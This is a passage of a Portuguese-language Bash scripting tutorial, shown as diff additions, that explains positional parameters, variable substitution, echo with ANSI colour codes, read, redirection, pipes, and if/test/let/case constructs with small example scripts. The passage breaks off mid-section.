+10: 1 2 3 4 5 6 7 8 9 0
+executando "shift"
+9: 2 3 4 5 6 7 8 9 0
+executando "shift 5"
+4: 7 8 9 0
+executando "shift 7"
+4: 7 8 9 0
+/* -=-=-=-=-= shift =-=-=-=-=- */
+
+   Os valores que saem são perdidos. Use com atenção!
+
+
+
+2.4.2. set (para editar parâmetros)
+       ----------------------------
+
+   O que vou passar neste tópico não é sobre como usar "todo o poder do
+comando set", e sim como usar set especificamente para editar parâmetros.
+Não tem nenhum segredo! Veja este exemplo:
+
+set um dois tres
+
+   Isso fará com que $1 seja 'um', $2 seja 'dois', $3 seja 'tres' e só!
+Não existirá $4, $5, etc. mesmo que eles tenham sido usados. Veja um
+exemplo de script:
+
+/* ----------------- */
+<++> BashScript/setparam.sh
+#!/bin/bash
+
+echo "Os $# parâmetros passados inicialmente foram: $@"
+echo
+echo "e agora eu vou alterá-los!"
+echo "como eu sou mau... (huahuahau risada diabólica huahuahuha)"
+echo
+set um dois tres
+echo "Os $# novos parâmetros agora são: $@"
+echo
+<-->
+/* ----------------- */
+
+   Não interessa quantos parâmetros você passar para este script, no
+final você só terá $1, $2 e $3 valendo 'um', 'dois' e 'tres',
+respectivamente.
+
+   No meu Mextract.sh (tópico 9.5.) esta característica do set é muito
+bem aproveitada! ;-)
+
+
+
+2.5. Substituição de Variáveis
+     =========================
+
+   Isto é muito útil e pode ser muito mais elegante que ficar usando if's
+(explicados mais adiante) sem necessidade! Veja que bacana! ;-)
+
+
+--> ${variavel:-string}
+
+   Se "variavel" não tiver sido definida ou for vazia será substituída por
+"string". O valor da variável não é alterado. Veja este exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+$ echo ${URL:-"http://unsekurity.virtualave.net"}
+http://unsekurity.virtualave.net
+$ echo $URL # observe que URL nao foi alterado
+
+/* -=-=-= exemplo =-=-=- */
+
+
+--> ${variavel:=string}
+
+   Se "variavel" não estiver sido definida ou for vazia, receberá
+"string". Exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+$ echo ${WWW:="http://meleu.da.ru"}
+http://meleu.da.ru
+$ echo $WWW
+http://meleu.da.ru
+/* -=-=-= exemplo =-=-=- */
+
+
+--> ${variavel:?string}
+
+   Se "variavel" não estiver sido definido ou for vazia, "string" será
+escrito em stderr (saída de erro padrão). O valor da variável não é
+alterado. Veja um exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+$ echo ${EDITOR:?"Nenhum editor de texto"}
+bash: EDITOR: Nenhum editor de texto
+$ echo $EDITOR
+
+/* -=-=-= exemplo =-=-=- */
+
+
+--> ${variavel:+string}
+
+   Se "variavel" estiver definida, será substituída por "string" mas seu
+valor não será alterado. Exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+$ echo ${BROWSER:+"BROWSER definido como \"$BROWSER\""}
+BROWSER definido como "links"
+/* -=-=-= exemplo =-=-=- */
+
+
+
+--------------------------------------------------------------------------
+
+
+
+3. Entrada e Saída (I/O)
+   *********************
+
+   Comunicando-se...
+
+
+
+3.1. echo
+     ====
+
+   Nos já usamos o echo para escrever na tela, mas aqui vamos tratar de
+alguns "segredinhos" (que não são tão secretos assim).
+
+   Existem alguns momentos que você não quer que a saída do echo pule de
+linha automaticamente. Para isso use o parâmetro "-n". Este parâmetro é
+útil quando você vai entrar com algo após o echo. Veja este script:
+
+/* ----------------- */
+<++> BashScript/filetype.sh
+#!/bin/bash
+echo -n "Entre com o nome do arquivo: "
+read FILE
+echo "Tipo do arquivo `file $FILE`"
+<-->
+/* ----------------- */
+
+Execute e veja o resultado.
+
+
+   Muita atenção deve ser tomada ao usar o echo, pois as aspas que você
+pode vir a deixar de usar podem fazer uma diferença danada (em alguns
+casos isso pode ser muito útil).
+
+/* -=-=-= exemplo =-=-=- */
+$ echo uma    boa   rede de irc     que conheco eh     irc.linux.org
+uma boa rede de irc que conheco eh irc.linux.org
+$ echo "uma    boa   rede de irc     que conheco eh     irc.linux.org"
+uma    boa   rede de irc     que conheco eh     irc.linux.org
+$
+$ # agora um exemplo com variavel
+$
+$ TESTE="primeira linha da variavel
+> segunda linha
+> terceira...
+> chega! :)
+> "
+$ echo $TESTE
+primeira linha da variavel segunda linha terceira... chega! :)
+$ echo "$TESTE"
+primeira linha da variavel
+segunda linha
+terceira...
+chega! :)
+
+/* -=-=-= exemplo =-=-=- */
+
+
+   A esta altura você já deve ter se perguntado "Como faço para imprimir
+caracteres nova linha ou beep?!". Os mais malandrinhos devem ter tentado um
+contra-barra (backslash) '\', mas você não pode simplesmente fazer isso.
+É necessário usar o parâmetro "-e" com o echo. Este parâmetro permite que
+usemos sequências de escape contra-barra.
+   As sequências são iguais a da linguagem C, exemplo: \n para nova
+linha, \a para beep, \b para backspace, etc...
+   Veja este exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+$ echo -e "module caiu de cara tentando \"top soul\".\nQue paia\a"!
+module caiu de cara tentando "top soul".
+Que paia!
+/* -=-=-= exemplo =-=-=- */
+
+   O -e é também usado para escrever coloridinho (ai que fofo!), e outras
+coisas interessantes. Veremos isso no tópico seguinte.
+
+
+
+3.1.1 Sequências de Escape ANSI
+      -------------------------
+
+   Para usar cores a sequência de escape é "\e[<NUM>m" (os sinais '<' e '>'
+não entram!). Veja um exemplo (mais a frente você verá tabelas com os
+significados destas sequências):
+
+/* ----------------- */
+<++> BashScript/amarelinho.sh
+#!/bin/bash
+# imprime amarelinho no centro da linha
+
+# A variável $COLUMNS contém o número de colunas que o terminal está
+# usando, e antes de executar este script você precisa exportá-la:
+# [prompt]$ export COLUMNS
+[ $COLUMNS ] || {
+	echo Você precisa exportar a variável \"COLUMNS\":
+	echo "Tente \"export COLUMNS\" e tente executar novamente"
+	exit 1
+}
+
+POSICAO=$[ ( $COLUMNS - `expr length "$*"` ) / 2 ]
+# `expr length "$*"` retorna o número de caracteres digitados
+# como parâmetros.
+
+echo -e "\e[${POSICAO}C\e[33;1m$*\e[0m"
+
+<-->
+/* ----------------- */
+
+   Agora uma explicação ligeira: o \e diz ao echo que o que vem depois é
+uma sequência de escape.
+   Se você der a sequência '[<num>C', onde num é um número qualquer, o
+cursor vai andar "num" caraceteres para a direita. Acima eu uso a variável
+POSICAO para mover o cursor para o centro da linha (veja o cálculo no
+código).
+   O comando '[<num>m' muda para a cor "num". Cada cor tem um código
+próprio. No exemplo acima o 33 faz ficar marrom, porém combinando com o 1
+fica amarelo (isso no modo texto, pois no xterm, por exemplo, o 1 faz o
+marrom ficar em negrito. veja OBSERVAÇÕES mais adiante).
+
+   Veja uma tabela com os códigos de movimentação de cursor que eu conheço
+(os caracteres '<' e '>' devem ser ignorados):
+
+   ,-------------,------------------------------------------------,
+   |   Código    |         O que faz                              |
+   |-------------|------------------------------------------------|
+   | \e[<N>A     | Move o cursor N linhas acima.                  |
+   |-------------|------------------------------------------------|
+   | \e[<N>B     | Move o cursor N linhas abaixo.                 |
+   |-------------|------------------------------------------------|
+   | \e[<N>C     | Move o cursor N colunas à direita.             |
+   |-------------|------------------------------------------------|
+   | \e[<N>D     | Move o cursor N colunas à esquerda.            |
+   |-------------|------------------------------------------------|
+   | \e[<N>E     | Move o cursor N linhas para baixo na coluna 1. |
+   |-------------|------------------------------------------------|
+   | \e[<N>F     | Move o cursor N linhas para cima na coluna 1.  |
+   |-------------|------------------------------------------------|
+   | \e[<N>G     | Coloca o cursor na linha N.                    |
+   |-------------|------------------------------------------------|
+   | \e[<L>;<C>H | Coloca o cursor na linha L e na coluna C.      |
+   |-------------|------------------------------------------------|
+   | \e[<N>I     | Move o cursor N tabulações à direita.          |
+   |-------------|------------------------------------------------|
+   |             | N=0  Apaga do cursor até o fim da tela;        |
+   | \e[<N>J     | N=1  Apaga do cursor até o início da tela;     |
+   |             | N=2  Apaga a tela toda.                        |
+   |-------------|------------------------------------------------|
+   |             | N=0  Apaga do cursor até fim da linha;         |
+   | \e[<N>K     | N=1  Apaga do cursor até o início da linha;    |
+   |             | N=2  Apaga a linha toda.                       |
+   |-------------|------------------------------------------------|
+   | \e[<N>L     | Adiciona N linhas em branco abaixo da atual.   |
+   |-------------|------------------------------------------------|
+   | \e[<N>M     | Apaga N linhas abaixo da atual.                |
+   |-------------|------------------------------------------------|
+   | \e[<N>P     | Apaga N caracteres a direita.                  |
+   |-------------|------------------------------------------------|
+   | \e[<N>S     | Move a tela N linhas para cima.                |
+   |-------------|------------------------------------------------|
+   | \e[<N>T     | Move a tela N linhas para baixo.               |
+   |-------------|------------------------------------------------|
+   | \e[<N>X     | Limpa N caracteres à direita (com espaços).    |
+   |-------------|------------------------------------------------|
+   | \e[<N>@     | Adiciona N espaços em branco.                  |
+   |-------------|------------------------------------------------|
+   | \e[s        | Salva a posição do cursor.                     |
+   |-------------|------------------------------------------------|
+   | \e[u        | Restaura a posição do cursor que foi salva.    |
+   '-------------'------------------------------------------------'
+
+   Sim, a lista é grande... Faça uns testes para praticar um pouquinho.
+
+   Agora uma tabelinha dos atributos e seus números (N deve estar no
+formato "\e[<N>m"):
+
+     ,-----------------------------,----,-------------,---,
+     | Atributo                    | N  | Cor         | X |
+     |-----------------------------|----|-------------|---|
+     | Desligar todos atributos    | 0  | Preto       | 0 |
+     | Negrito                     | 1  | Vermelho    | 1 |
+     | Cor X para o primeiro plano | 3X | Verde       | 2 |
+     | Cor X para o segundo plano  | 4X | Marrom      | 3 |
+     | Sublinhado                  | 4  | Azul        | 4 |
+     | Piscando (blink)            | 5  | Roxo        | 5 |
+     | Vídeo reverso               | 7  | Ciano       | 6 |
+     |             -x-             | -- | Branco      | 7 |
+     '-----------------------------'----'-------------'---'
+
+OBSERVAÇÕES:
+   -> Negrito, Sublinhado e Piscando possuem comportamentos diferentes no
+console e nos emuladores de terminal. Principalmente quando temos negrito
+sendo usado com cores.
+   Por exemplo, o código "\e[33m" irá ativar o marrom mas se for usado
+(no console!) com o atributo de negrito ficará amarelo, e o código será
+assim: "\e[1;33m". Por isso faça os testes que você descobrirá as cores
+   -> Estas tabelas eu fiz graças a uma matéria que o aurélio escreveu
+sobre isso. Veja em http://verde666.org/coluna/
+
+
+   No tópico "6.1 Funções como comandos" você verá o Mfunctions, ele
+contém uma função que mostra todas as combinações de cores possíveis.
+
+
+
+3.2. read
+     ====
+
+   Como você viu no script anterior para entrar com um dado usa-se "read".
+O read tem alguns "macetinhos". Pra começar: você não precisa colocar um
+echo toda hora que for usar o read para escrever um prompt. Basta fazer
+"read -p prompt variavel"
+   Veja esta seção de exemplos:
+
+/* ----------------- */
+<++> BashScript/read1.sh
+#!/bin/bash
+read -p "Entre com uma string: " string
+echo $string
+<-->
+/* ----------------- */
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ ./read1.sh
+Entre com uma string: klogd eh um tremendo cachacero!
+klogd eh um tremendo cachacero!
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+/* ----------------- */
+<++> BashScript/read2.sh
+#!/bin/bash
+read -p "Entre com 3 strings: " s1 s2 s3
+echo "s1 = $s1     s2 = $s2     s3 = $s3"
+<-->
+/* ----------------- */
+
+/* -=-=-=-=-= exemplo2 =-=-=-=-=- */
+$ ./read-2.sh
+Entre com 3 strings: j00nix eh cabecudo
+s1 = j00nix     s2 = eh     s3 = cabecudo
+
+               # o mesmo script com mais de 3 strings #
+
+$ ./read-2.sh
+Entre com 3 strings: eSc2 adora ficar de copy'n'paste no IRC.
+s1 = eSc2     s2 = adora     s3 = ficar de copy'n'paste no IRC.
+/* -=-=-=-=-= exemplo2 =-=-=-=-=- */
+
+   Quando o "read" vai ler apenas uma variável, toda a string vai ser
+atribuída a esta variável. Quando vai ler mais de uma variável ele atribui
+cada string a sua respectiva variável; e quando o número de strings excede
+o número de variáveis a última fica com o excedente.
+
+   O parâmetro "-s" serve para não ecoar o que for digitado. É útil para
+digitar uma senha por exemplo. Tente "read -s PASS" e veja.
+
+   Você também pode determinar o número de caracteres que serão lidos com
+o parâmetro "-n". Tente fazer "read -n 10 VAR". Mas cuidado: ao usar a
+opção -n você não poderá usar o backspace para fazer correções.
+
+   A opção "-r" serve para que a contra-barra (backslash) não aja como um
+caracter de escape. E isso me foi bastante útil para fazer o Mextract,
+como você verá adiante.
+
+   Mais sobre o read na manpage do bash.
+
+
+
+3.3. Redirecionamento
+     ================
+
+   Quem já sabe programar deve saber que existem três "file descriptors"
+abertos por padrão (pelo menos nos sistemas operacionais que conheço):
+stdin (standard input), stdout (standard output) e stderr (standard error).
+Para fins práticos, estes são considerados arquivos e você pode direcionar
+destes "arquivos" para outros e vice-versa.
+Veja como direcionar de:
+
++ arquivo para stdin
+     $ programa < arquivo
+
++ stdout para arquivo
+     $ programa > arquivo
+
++ stderr para arquivo
+     $ programa 2> arquivo
+ 
++ stdout para stderr
+     $ programa 1>&2
+
++ stderr para stdout
+     $ programa 2>&1
+
++ stdout e stderr para arquivo
+     $ programa &> arquivo
+
+   Se você usar por exemplo "find / -perm -2 > worldwritable.txt" e no
+diretório não tiver um arquivo chamado "worldwritable.txt" este será
+criado, a saída do comando será gravada nele e a saída de erro padrão
+será impressa na tela (ou écran, se preferirem :P ). Para não ver as
+mensagens de "Permission Denied" faça isso:
+
+     $ find / -perm -2 > worldwritable.txt 2> /dev/null
+
+    Ainda temos um probleminha: este comando irá mostrar também todos os
+links simbólicos e vários arquivos de dispositivo. Para eliminar os links
+simbólicos faça o seguinte:
+
+     $ find / -perm -2 ! -type l > worldwritable.txt 2> /dev/null
+
+   Você ainda pode eliminar da saída os arquivos com stick bit e os
+arquivos de dispositivo usando parênt... EI!! Isto aqui é sobre
+redirecionamento, e não sobre o find! Vá ler a man page do find! =P
+
+   Se o arquivo já existir seu conteúdo será sobregravado. Mas você pode
+apenas concatenar o conteúdo no final do arquivo usando ">>". Exemplo:
+
+     $ echo " F I M  D O  A R Q U I V O " >> worldwritable.txt
+
+   Faça os testes e tire suas conclusões! ;)
+
+   Veja este script a seguir a execute ele usando redirecionamento na linha
+de comando pra ver os resultados
+
+/* ----------------- */
+<++> BashScript/redirecionamento.sh
+#!/bin/bash
+echo "Isto vai para a saída padrão."
+echo "Isto vai para a saída de erro padrão." 1>&2
+echo "Isto vai criar um arquivo e colocar esta linha nele." > ARQUIVO
+echo "Esta linha vai para o final do arquivo." >> ARQUIVO
+<-->
+/* ----------------- */
+
+   Tem um outro tipo de redirecionamento que é bastante útil. É assim:
+
+    $ programa << delimitador
+
+   Isto quer dizer que o programa vai ler o arquivo stdin até encontrar o
+delimitador.
+   Isso é muito útil para usar programas externos através de shell
+scripts.
+Você pode, por exemplo, usar este tipo de redirecionamento para fazer um
+shell script escrever um outro arquivo usando o comando "cat". Vamos a um
+exemplo em que eu crio um código de programa escrito em C através do
+script (note que as variáveis do script SÃO interpretadas):
+
+/* ----------------- */
+<++> BashScript/catredir.sh
+#!/bin/bash
+
+NAME=`whoami`
+
+echo -e "\n\tCRIANDO O ARQUIVO arquivo.c\n"
+
+# O arquivo.c terminará quando encontrar a string _EOF_
+cat << _EOF_ > arquivo.c
+#include <stdio.h>
+
+int main (void) {
+        printf ("\n\tPrograma que não faz nada além disso.\n");
+        printf ("\tFeito por $NAME\n\n");
+        return 0;
+}
+_EOF_
+# O arquivo.c acabou na linha ACIMA do _EOF_
+# Observe no arquivo.c o $NAME será "traduzido" para o username adequado
+
+echo -e "\n\tCOMPILANDO O PROGRAMA\n"
+gcc arquivo.c -o arquivo
+
+echo -e "\n\tFEITO!\n"
+<-->
+/* ----------------- */
+
+
+
+3.3.1. Pipe
+       ====
+
+   Agora vejamos o pipe. Sua sintaxe é:
+
+     $ programa1 | programa2
+
+   O pipe é usado para você fazer da saída de um programa a entrada de
+outro (como usado no exemplo amarelinho.sh já mostrado anteriormente).
+   Apesar de simples o pipe é muito útil e poderoso. Veja este exemplo
+muito simples:
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ who
+meleu    tty1     Nov 20 01:40
+hack     tty2     Nov 20 01:45
+root     tty3     Nov 20 02:44
+$ who | cut -c-9
+meleu
+hack
+root
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+   Mais exemplos serão dados ao longo do texto.
+
+
+
+3.3.1.1. Comandos Úteis com o Pipe
+         =========================
+
+--> xargs
+
+   O xargs transforma stdin em argumentos da linha de comando. Vamos usar
+o exemplo anterior de novo:
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ who | cut -c-9	# lembrando: pipe transforma stdout em stdin
+meleu
+hack
+root
+$ # "echo" nao le arquivo, ele usa argumentos.
+$ # A linha abaixo nao tem utilidade.
+$ who | cut -c0-9 | echo
+
+$ # "xargs" transforma o conteudo de stdin em argumentos
+$ who | cut -c0-9 | xargs echo
+meleu hack root
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+   Como eu gosto do find não resisti e colocarei um comando interessante
+que usa pipe e xargs:
+
+$ find / -perm -2 ! -type l ! -type c | xargs ls -ld > wordwritable.txt
+
+   Se não entendeu algo do comando acima e quer entender, olhe as
+manpages.
+
+
+--> tee
+
+   Outro comando bom de se usar com pipe é o "tee". Ele faz com que a
+saída do programa vá para a saída padrão, normalmente a tela (écran) *E*
+para um arquivo ao mesmo tempo.
+   É como se você fizesse "programa > arquivo" só que o saída do programa
+também seria escrita na saída padrão. Experimente:
+
+$ ls -la |tee conteudo.txt
+
+
+
+
+
+--------------------------------------------------------------------------
+
+
+
+4. Comandos de Tomadas de Decisão
+   ******************************
+
+   Agora sim o negócio começa a ficar legal! :-)
+
+   O jeito como as estruturas estão explicadas é o que eu uso, mas não
+é o único. Se você quer uma referência mais completa veja a manpage do
+bash.
+
+
+4.1 if-then-else e afins
+    ====================
+
+   A estrutura básica é a seguinte:
+
+   if <expressão>; then
+     <instrução(ões) se expressão retornar verdadeiro>
+   else
+     <instrução(ões) se expressão retornar falso>
+   fi
+
+Primeiro devemos saber que todos os comandos do UNIX possuem um código de
+retorno. Este código tem valor 0 quando a operação ocorre com sucesso e
+valor diferente de zero quando a operação NÃO termina com sucesso. Após
+cada comando o valor de retorno é gravado na variável $?, experimente um
+"echo $?" depois de algum comando e veja!
+   A avaliação de verdadeiro do bash é exatamente o oposto de outras
+linguagens de programação (C por exemplo), que avaliam a expressão de
+retorno diferente de 0 como verdadeira e 0 como falso. No bash, quando um
+comando retorna 0 o if avalia como verdadeiro e quando retorna um
+não-zero significa falso. (Para mais detalhes sobre os códigos de
+retorno, olhe a página manual do bash na seção "EXIT STATUS").
+   Veja um exemplo:
+
+/* ----------------- */
+<++> BashScript/return.sh
+#!/bin/bash
+read -p "Entre com o nome do diretório: " DIR
+if ( cd $DIR 2> /dev/null ); then
+        echo -e "'cd $DIR' retornou \"sucesso\" ($?)"
+else
+        echo -e "'cd $DIR' retornou \"insucesso\" ($?)"
+fi
+<-->
+/* ----------------- */
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+meleu:~$ ./return.sh
+Entre com o nome do diretório: /usr
+'cd /usr' retornou "sucesso" (0)
+
+meleu:~$ ./return.sh
+Entre com o nome do diretório: dir_invalido
+'cd dir_invalido' retornou "insucesso" (1)
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+   O valor de retorno do comando "cd /usr" foi 0 portanto foi executado
+com sucesso, já o retorno de "cd /dir_invalido" foi 1 porque ocorreu um
+erro. Agora repare no final que mesmo com um "cd /usr" continuo no
+diretório HOME (~). Isto prova que um shell script usa um shell a parte
+(shell "filho") e não o shell que chama o script (shell pai).
+(Chato ficar lendo isso toda hora né? Esta foi a última vez! :P)
+
+
+
+4.1.1. test
+       ----
+
+   Para fazer testes mais arrojados usamos o comando "test". A maneira
+de usar o test muda de acordo com o que estamos querendo testar. Se estamos
+comparando strings ou se estamos comparando números, e por aí vai... Existe
+uma sintaxe para cada tipo de interpretação que queremos dar a um dado. Por
+exemplo: "0001" é diferente da string "1" mas o valor numérico é igual.
+E por isso usamos sintaxes diferentes, para que o comando saiba que tipo de
+comparação estamos fazendo.
+   Continue lendo...
+
+
+--> expressões com strings:
+
+   O sinal de "=" verifica se a primeira string é igual a segunda; o "!="
+verifica se a primeira string é diferente da segunda; o parâmetro "-z"
+verifica se a string é vazia; e o parâmetro "-n" verifica se a string NÃO é
+vazia.
+
+/* -=-=-= exemplos =-=-=- */
+$ test "abcd" = "abcd"; echo $?
+0
+$ test "abcd" != "abcd"; echo $?
+1
+$ test "abcd" = "efgh"; echo $?
+1
+$ test "abcd" != "efgh"; echo $?
+0
+$ test -z "meleu"; echo $?
+1
+$ test -n "meleu"; echo $?
+0
+$ test -n ""; echo $?
+1
+$ test -z ""; echo $?
+0
+/* -=-=-= exemplos =-=-=- */
+
+   Uma maneira mais prática de usar o "test" e subistituí-lo pelos
+[colchetes].  É muito mais prático e bonitinho :P
+
+     $ test "meleu" = "$nome"
+
+      é o mesmo que fazer:
+   
+     $ [ "meleu" = "$nome" ]
+
+Muito melhor, não acham?! Vamos usar esta notação a partir de agora!
+
+   Agora vamos a uma dica útil pra hora de fazer comparações entre
+strings. Primeiro vamos a um exemplo e depois a uma explicação.
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ cat strcmp1.sh
+#!/bin/bash
+
+if [ $1 = $2 ]; then
+        echo As strings são iguais.
+fi
+
+$ ./strcmp1.sh meleu
+./strcmp.sh: [: meleu: unary operator expected
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+   Note que o test deu um erro, e por isso retornou um não-zero para o
+if.
+   Observe o seguinte:
+
+/* -=-=-=-=-= exemplo2 =-=-=-=-=- */
+$ cat strcmp2.sh
+#!/bin/bash
+
+if [ $1 = $2 ]; then
+        echo As strings são iguais.
+else
+        echo As strings são diferentes.
+fi
+
+$ ./strcmp2.sh meleu
+./strcmp.sh: [: meleu: unary operator expected
+As strings são diferentes.
+/* -=-=-=-=-= exemplo2 =-=-=-=-=- */
+
+   Aconteceu a mesma coisa que no primeiro exemplo, só que agora temos um
+else pra ser executado caso a expressao do if retorne falso (ou
+não-zero). Uma solução pra que não dê este erro no test é usar aspas
+duplas. Veja só:
+
+/* ------------------ */
+<++> BashScript/strcmp.sh
+#!/bin/bash
+
+if [ "$1" = "$2" ]; then
+        echo As strings são iguais.
+else
+        echo As strings são diferentes.
+fi
+<-->
+/* ------------------ */
+
+   Com este acontece tudo certo. ;)
+   Você também NÃO deve escrever tudo junto, assim: $1=$2 ou "$1"="$2"
+Desta maneira o test vai retornar sempre verdadeiro, pois seria como se
+você estivesse passado somente um parâmetro para ele.
+
+
+--> expressões com arquivos
+
+   O parâmetro "-e" verifica se é um arquivo regular; o "-d" verifica se é
+um diretório; e o "-x" verifica se o arquivo é executável. Obviamente se
+o arquivo não existir ocorrerá um erro.
+
+/* -=-=-= exemplo =-=-=- */
+$ [ -f /bin/ls ]; echo $?
+0
+$ [ -d /bin/ls ]; echo $?
+1
+$ [ -x /bin/ls ]; echo $?
+0
+/* -=-=-= exemplo =-=-=- */
+
+   Lógico que não existem só esses três! Consulte a página man do test
+que você verá muitos outros parâmetros para expressões com arquivos.
+
+
+--> expressões aritméticas
+
+   Aqui é bem diferente das linguagens de programação comuns... Não
+podemos utilizar os operadores que estamos acostumados, como '=' para
+igual, '<' para menor e assim por diante... Temos que utilizar outros
+operadores (que não são tão difíceis de decorar). São eles:
+
+     -eq      igual (EQual);
+     -ne      diferente (Not-Equal);
+     -lt      menor que, "<" (Less Than);
+     -le      menor ou igual, "<=" (Less than or Equal);
+     -gt      maior que, ">" (Greater Than);
+     -ge      maior ou igual, ">=" (Greater than or Equal).
+
+/* -=-=-= exemplo =-=-=- */
+$ [ 2 -eq 2 ]; echo $?
+0
+$ [ $? -lt 5 ]; echo $?
+0
+$ [ 1 -le 1 ]; echo $?
+0
+$ [ 2 -ne 2 ]; echo $?
+1
+/* -=-=-= exemplo =-=-=- */
+
+   Dê uma olhadinha neste script (meio besta, é verdade) pra ver como é
+diferente o valor numérico e o valor string de duas variáveis.
+
+/* ----------------- */
+<++> BashScript/string_number.sh
+#!/bin/bash
+NUM1=1
+NUM2=00001
+
+if [ "$NUM1" = "$NUM2" ];
+then
+  echo "O valor string de $NUM1 e $NUM2 são iguais."
+else
+  echo "O valor string de $NUM1 e $NUM2 são diferentes."
+fi
+
+if [ $NUM1 -eq $NUM2 ];
+then
+  echo "O valor numérico de $NUM1 e $NUM2 são iguais."
+else
+  echo "O valor numérico de $NUM1 e $NUM2 são diferentes."
+fi
+<-->
+/* ----------------- */
+
+   Aproveitando o assunto "números" aí vai uma informação útil:
+   Para fazer cálculos aritméticos podemos fazer o seguinte esquema
+
+/* -=-=-= exemplo =-=-=- */
+$ echo $[ 2 * 3 + 4 ]
+10
+$ echo $[ 2 * ( 3 + 4 ) ]
+14
+/* -=-=-= exemplo =-=-=- */
+
+   Basta colocar a expressão entre $[cifrão-colchetes], sacou? Você
+também pode usar $((cifrão-dois-parênteses)) mas os colchetes são bem
+mais práticos.
+   Se você pretende usar mais coisa relacionada a matemática, então
+aprenda a usar o comando "bc" (via man page ou info). Mas se vai ficar só
+no "papai-mamãe" das operações básicas pode ficar usando $(()) ou $[]
+(OBS.: em operações de divisão os resultados não são muito satisfatórios).
+
+
+--> operadores lógicos (AND e OR)
+
+   Para usar os operadores lógicos basta usar "-a" para AND e "-o" para OR.
+Muito simples. O exemplo a seguir usa o AND e também usa um novo tipo de
+comando de controle, o "elif", que é a mesma coisa que "else if", só que
+se você usar "else if" vai precisar de um "fi" para fechar. O elif não
+precisa disso.
+Preste atenção que é fácil de entender para quem tem noção de algoritmo:
+
+/* ----------------- */
+<++> BashScript/crescente.sh
+#!/bin/bash
+read -p "Entre com o primeiro número: " NUM1
+read -p "Entre com o segundo número: " NUM2
+read -p "Entre com o terceiro número: " NUM3
+
+# Observe o "-a" (AND) na expressão abaixo
+if [ $NUM1 -le $NUM2 -a $NUM1 -le $NUM3 ]; then
+    MENOR=$NUM1
+    if [ $NUM2 -le $NUM3 ]; then
+        MEIO=$NUM2
+        MAIOR=$NUM3
+    else
+        MEIO=$NUM3
+        MAIOR=$NUM2
+    fi
+elif [ $NUM2 -le $NUM3 ]; then
+    MENOR=$NUM2
+    if [ $NUM1 -le $NUM3 ]; then
+        MEIO=$NUM1
+        MAIOR=$NUM3
+    else
+        MEIO=$NUM3
+        MAIOR=$NUM1
+    fi
+else
+    MENOR=$NUM3
+    if [ $NUM1 -le $NUM2 ]; then
+       MEIO=$NUM1
+       MAIOR=$NUM2
+    else
+       MEIO=$NUM2
+       MAIOR=$NUM1
+    fi
+fi
+
+echo "$MENOR < $MEIO < $MAIOR"
+<-->
+/* ----------------- */
+
+   O "-o" é no mesmo estilo. Faça uns testes e verá.
+
+
+
+
+4.1.2. let
+       ---
+
+   O let é um comando embutido no bash (e isto quer dizer que se você
+quiser info sobre ele tem que ver na manpage do bash, mais
+especificamente no tópico ARITHMETIC EVALUATION). Ele é bastante útil para
+quem está acostumado com programação C, pois sua sintaxe é parecidíssima,
+mas só é usado para expressões aritméticas.
+   Com este comando você pode comparar valores numéricos com os sinais <,
+>, <=, >=, ==, e !=. E mais bastante coisa comum em linguagem C (como por
+exemplo o ++ e o --). Alguns exemplos do que você pode fazer:
+
+let var++		# equivalente a "var=$[ $var + 1 ]"
+let var--		# equivalente a "var=$[ $var - 1 ]"
+let "$num > 2"		# equivalente a "[ $num -gt 2 ]"
+
+   Outra coisa interessante é que você pode substituir
+
+let "expressao"
+
+por
+
+(( expressao ))
+
+Portanto os exemplos acima poderiam ser feitos assim:
+
+(( var++ ))
+(( var-- ))
+(( $num > 2 ))
+
+   Veja este script abaixo apenas para entender a utilidade do let:
+
+/* ----------------- */
+<++> BashScript/lettest.sh
+#!/bin/bash
+
+if (( $# != 2 )) ; then    # poderia ser: if let "$# != 2"
+        echo "Uso: `basename $0` N1 N2" 1>&2
+        exit 1
+fi
+
+if (( $1 > $2 )) ; then    # poderia ser: if let "$1 > $2"
+        echo "$1 é maior que $2"
+elif (( $1 == $2 )) ; then    # poderia ser: elif let "$1 == $2"
+        echo "$1 é igual a $2"
+else
+        echo "$1 é menor que $2"
+fi
+<-->
+/* ----------------- */
+
+
+
+4.2. case
+     ====
+
+   A sintaxe do case é:
+
+   case WORD in
+   padrao1)
+	<lista de comandos>
+	;; 
+   padrao2)
+	<lista de comandos>
+	;;
+   *)
+	<lista de comandos se nenhum padrao for casado>
+	;;
+   esac
+
+   Como nós sabemos, um ';' serve para dizer ao shell que um comando
+acabou, e se quisermos podemos começar outro depois disso. Ex.: 
+
+echo ; echo MELEU ; echo
+
+E para dizer ao shell que terminamos uma opção do 'case' usamos dois ';;'.
+
+   Para os padrões você pode usar uns curingas parecidos com os usados
+para nomes de arquivos, que são '*', '?' e a '[lista]'. Os detalhes
+destes curingas são explicados na seção "Pathname Expansion" da manpage.
+
+   Veja este script muito besta, sem utilidade prática e meramente
+ilustrativo (se quer exemplo prático veja na seção 9.3. howto.sh):
+
+/* ----------------- */
+<++> BashScript/casetest.sh
+#!/bin/bash
+
+if [ -z "$1" ]; then
+    echo "Entre com um parâmetro"
+    exit 1
+fi
+
+case "$1" in
+
+*a)
+    echo "você digitou algo que termina com 'a'" ;;
+
+?b)
+    echo "você digitou algum caractere seguido de um 'b'" ;;
+
+[A-Za-z]c)
+    echo "você digitou um caractere do alfabeto seguido de um 'c'" ;;
+
+m|M)	# esta barra '|' serve como um "ou"
+    echo MELEU;;
+
+*)
+    echo "nenhum dos parâmetros definidos foi usado" ;;
+
+esac
+
+<-->
+/* ----------------- */
+
+   Agora pratique um pouco!! ;-)
+
+   Veja outros exemplos na seção 9. Exemplos Variados.
+
+
+
+4.3. Tomadas de decisão com && e ||
+     ==============================
+
+   Esta maneira de tomar decisões é bem compacta, mas não aceita "else".
